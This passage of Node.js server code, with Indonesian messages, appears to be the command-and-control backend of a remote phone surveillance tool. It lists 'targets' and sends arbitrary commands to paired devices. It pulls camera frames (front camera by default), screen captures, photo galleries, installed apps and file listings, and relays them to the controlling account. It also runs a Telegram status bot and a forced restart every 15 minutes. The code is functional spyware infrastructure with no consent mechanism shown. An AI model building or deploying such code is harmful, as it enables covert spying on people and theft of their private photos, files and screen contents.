    broadcastControlDevices(owner ? owner.uid : pairingId, pairingId);
  });

  socket.on("device:status", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d) return;
    d.status = data.status || "Online";
    d.lastSeen = new Date().toISOString();
    if (data.battery != null) d.battery = Number(data.battery);
    saveControlDevices();
    broadcastControlDevices(d.uid, d.pairingId || null);
  });

  socket.on("device:response", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d) return;
    d.lastResponse = data;
    d.lastSeen = new Date().toISOString();
    saveControlDevices();
    broadcastControlDevices(d.uid, d.pairingId || null);
    controlIO.sockets.sockets.forEach(sock => {
      if (String(sock.data?.uid || "") === String(d.uid)) {
        sock.emit("device:response", data);
      }
    });
  });

  socket.on("camera:frame", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d || !data.frame) return;
    controlCameraFrames[data.deviceId] = data.frame;
    controlIO.sockets.sockets.forEach(sock => {
      if (String(sock.data?.uid || "") === String(d.uid)) {
        sock.emit("camera:frame", {
          deviceId: data.deviceId,
          frame: data.frame
        });
      }
    });
  });

  socket.on("screen:frame", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d || !data.frame) return;
    controlIO.sockets.sockets.forEach(sock => {
      if (String(sock.data?.uid || "") === String(d.uid)) {
        sock.emit("screen:frame", {
          deviceId: data.deviceId,
          frame: data.frame
        });
      }
    });
  });

  socket.on("device:gallery", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d) return;
    controlGalleryData[data.deviceId] = data;
    controlIO.sockets.sockets.forEach(sock => {
      if (String(sock.data?.uid || "") === String(d.uid)) {
        sock.emit("device:gallery", data);
      }
    });
  });

  socket.on("device:apps", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d) return;
    controlIO.sockets.sockets.forEach(sock => {
      if (String(sock.data?.uid || "") === String(d.uid)) {
        sock.emit("device:apps", data);
      }
    });
  });

  socket.on("device:files", (data = {}) => {
    const d = controlDevices[data.deviceId];
    if (!d) return;
    controlIO.sockets.sockets.forEach(sock => {
      if (String(sock.data?.uid || "") === String(d.uid)) {
        sock.emit("device:files", data);
      }
    });
  });

  socket.on("disconnect", () => {
    controlControllers.delete(socket.id);
    for (const [id, d] of Object.entries(controlDevices)) {
      if (d.socketId === socket.id) {
        d.status = "Offline";
        d.lastSeen = new Date().toISOString();
        saveControlDevices();
        broadcastControlDevices(d.uid, d.pairingId || null);
      }
    }
  });
});

function requireControlAuth(req, res, next) {
  const token = req.headers["x-auth-token"] || req.query.token;
  const user = getControlUserByToken(token);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  req.controlUser = user;
  req.controlUid = user.uid || user.username;
  const pairingId = String(req.headers["x-pairing-id"] || req.query.pairingId || "").trim();
  if (pairingId) {
    if (controlPairings[pairingId] !== String(req.controlUid)) {
      return res.status(403).json({ error: "Pairing ID belum terhubung ke akun ini" });
    }
    req.controlPairingId = pairingId;
  }
  next();
}

app.post("/api/control/pair", requireControlAuth, (req, res) => {
  const pairingId = String(req.body?.pairing_id || req.body?.pairId || "").trim();
  if (!/^[A-Za-z0-9_-]{8,128}$/.test(pairingId)) return res.status(400).json({ error: "Pairing ID tidak valid" });
  const uid = String(req.controlUid);
  if (controlPairings[pairingId] && controlPairings[pairingId] !== uid) return res.status(409).json({ error: "Pairing ID sudah digunakan akun lain" });
  controlPairings[pairingId] = uid;
  saveControlPairings();
  res.json({ ok: true, pairingId, devices: controlDeviceList(uid, pairingId) });
});

app.get("/api/control/pair/:pairingId", requireControlAuth, (req, res) => {
  const pairingId = String(req.params.pairingId || "").trim();
  if (controlPairings[pairingId] !== String(req.controlUid)) return res.status(403).json({ error: "Pairing tidak ditemukan" });
  res.json({ ok: true, pairingId, devices: controlDeviceList(req.controlUid, pairingId) });
});

app.get("/api/list-targets", requireControlAuth, (req, res) => {
  res.json(controlDeviceList(req.controlUid, req.controlPairingId || null));
});

app.post("/api/command/:deviceId", requireControlAuth, (req, res) => {
  const deviceId = req.params.deviceId;
  const command = String(req.body?.command || "").trim();
  const value = req.body?.value == null ? "" : String(req.body.value);
  if (!command || command.length > 64) {
    return res.status(400).json({ error: "Invalid command" });
  }

  const d = controlDevices[deviceId];
  if (!d || (req.controlPairingId
      ? String(d.pairingId || d.uid) !== String(req.controlPairingId)
      : String(d.uid) !== String(req.controlUid))) {
    return res.status(403).json({ error: "Device not found or unauthorized" });
  }

  // Perintah dikirim hanya ke perangkat yang sudah terdaftar pada UID pemilik.
  controlIO.to(`control-device:${deviceId}`).emit("command", {
    command,
    value,
  });

  res.json({ ok: true, command, deviceId });
});

app.get("/api/get-response/:deviceId", requireControlAuth, (req, res) => {
  const d = controlDevices[req.params.deviceId];
  if (!d || (req.controlPairingId
      ? String(d.pairingId || d.uid) !== String(req.controlPairingId)
      : String(d.uid) !== String(req.controlUid))) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  res.json({ data: d.lastResponse || {} });
});

app.get("/api/screenshot/:deviceId", requireControlAuth, (req, res) => {
  const d = controlDevices[req.params.deviceId];
  if (!d || (req.controlPairingId
      ? String(d.pairingId || d.uid) !== String(req.controlPairingId)
      : String(d.uid) !== String(req.controlUid))) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  const frame = controlCameraFrames[req.params.deviceId];
  if (frame) return res.json({ ok: true, frame });

  controlIO.to(`control-device:${req.params.deviceId}`).emit("command", {
    command: "camera",
    value: String(req.query.facing || "front"),
  });
  return res.status(404).json({ error: "No frame available yet" });
});

app.get("/api/gallery/:deviceId", requireControlAuth, (req, res) => {
  const d = controlDevices[req.params.deviceId];
  if (!d || (req.controlPairingId
      ? String(d.pairingId || d.uid) !== String(req.controlPairingId)
      : String(d.uid) !== String(req.controlUid))) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  controlIO.to(`control-device:${req.params.deviceId}`).emit("command", {
    command: "getGallery",
    value: "",
  });
  const data = controlGalleryData[req.params.deviceId];
  if (data) return res.json({ photos: data.photos || [] });
  return res.json({ photos: [] });
});


// =====================================================
// 🔥 START SERVER
// =====================================================
controlHttpServer.listen(PORT, () => {
  console.log(`🚯 Server aktif di http://nodecloudlegalraraapremium.xzcl.web.id:${PORT}`);
  startUserSessions()
  ToolsController.cleanupExpiredLogins();
});

const ID_GROUP_UTAMA = [-1003198722679];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(pesan, { parse_mode: "HTML" });
  } catch (err) {
    console.error("Gagal kirim status:", err.message);
  }
}

kirimStatusServer(`<b>${boldFont('STATUS SERVER')}</b>\n${THEME_SEP}\n〄  Server aktif kembali!\n〄  Auto restart setiap 15 menit\n${THEME_SEP}`);

function runOrphanClean() {
  console.log('🧹 [ORPHAN-CLEAN] Memeriksa session orphan...');
  cleanOrphanSessions();
  console.log('✅ [ORPHAN-CLEAN] Selesai!');
}

runOrphanClean();
setInterval(runOrphanClean, 1 * 60 * 1000);

function delaySync(ms) {
  const start = Date.now();
  while (Date.now() - start < ms) {}
}

setInterval(() => {
  kirimStatusServer(`<b>${boldFont('AUTO RESTART')}</b>\n${THEME_SEP}\n〄  Server restart dalam 5 detik...\n${THEME_SEP}`);
  console.log("❗ Auto restarting panel...");
  delaySync(2000);
  setTimeout(() => process.exit(0), 5000);
}, 15 * 60 * 1000);